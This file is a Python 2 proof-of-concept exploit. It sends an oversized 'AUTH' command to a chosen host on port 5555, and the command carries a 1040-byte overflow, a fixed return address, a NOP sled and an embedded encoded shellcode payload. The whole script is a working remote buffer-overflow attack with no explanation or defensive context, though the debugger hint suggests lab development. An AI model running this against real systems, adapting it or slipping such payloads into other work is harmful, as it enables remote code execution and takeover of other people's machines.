#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

shellcode = (
"\xb8\x2c\x26\x26\x89\xdb\xca\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x43\x12\x83\xc3\x04\x03\x6f\x28\xc4\x7c\x93\xdc\x8a"
"\x7f\x6b\x1d\xeb\xf6\x8e\x2c\x2b\x6c\xdb\x1f\x9b\xe6\x89\x93"
"\x50\xaa\x39\x27\x14\x63\x4e\x80\x93\x55\x61\x11\x8f\xa6\xe0"
"\x91\xd2\xfa\xc2\xa8\x1c\x0f\x03\xec\x41\xe2\x51\xa5\x0e\x51"
"\x45\xc2\x5b\x6a\xee\x98\x4a\xea\x13\x68\x6c\xdb\x82\xe2\x37"
"\xfb\x25\x26\x4c\xb2\x3d\x2b\x69\x0c\xb6\x9f\x05\x8f\x1e\xee"
"\xe6\x3c\x5f\xde\x14\x3c\x98\xd9\xc6\x4b\xd0\x19\x7a\x4c\x27"
"\x63\xa0\xd9\xb3\xc3\x23\x79\x1f\xf5\xe0\x1c\xd4\xf9\x4d\x6a"
"\xb2\x1d\x53\xbf\xc9\x1a\xd8\x3e\x1d\xab\x9a\x64\xb9\xf7\x79"
"\x04\x98\x5d\x2f\x39\xfa\x3d\x90\x9f\x71\xd3\xc5\xad\xd8\xbc"
"\x2a\x9c\xe2\x3c\x25\x97\x91\x0e\xea\x03\x3d\x23\x63\x8a\xba"
"\x44\x5e\x6a\x54\xbb\x61\x8b\x7d\x78\x35\xdb\x15\xa9\x36\xb0"
"\xe5\x56\xe3\x17\xb5\xf8\x5c\xd8\x65\xb9\x0c\xb0\x6f\x36\x72"
"\xa0\x90\x9c\x1b\x4b\x6b\x77\x2e\x87\x73\x28\x46\x95\x73\x27"
"\xcb\x10\x95\x2d\xe3\x74\x0e\xda\x9a\xdc\xc4\x7b\x62\xcb\xa1"
"\xbc\xe8\xf8\x56\x72\x19\x74\x44\xe3\xe9\xc3\x36\xa2\xf6\xf9"
"\x5e\x28\x64\x66\x9e\x27\x95\x31\xc9\x60\x6b\x48\x9f\x9c\xd2"
"\xe2\xbd\x5c\x82\xcd\x05\xbb\x77\xd3\x84\x4e\xc3\xf7\x96\x96"
"\xcc\xb3\xc2\x46\x9b\x6d\xbc\x20\x75\xdc\x16\xfb\x2a\xb6\xfe"
"\x7a\x01\x09\x78\x83\x4c\xff\x64\x32\x39\x46\x9b\xfb\xad\x4e"
"\xe4\xe1\x4d\xb0\x3f\xa2\x6e\x53\x95\xdf\x06\xca\x7c\x62\x4b"
"\xed\xab\xa1\x72\x6e\x59\x5a\x81\x6e\x28\x5f\xcd\x28\xc1\x2d"
"\x5e\xdd\xe5\x82\x5f\xf4")


req1 = "AUTH " + "\x41"*1040 + "\x71\xe8\xf9\x76" + "\x90" * 16 + shellcode + "\x43"*4
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
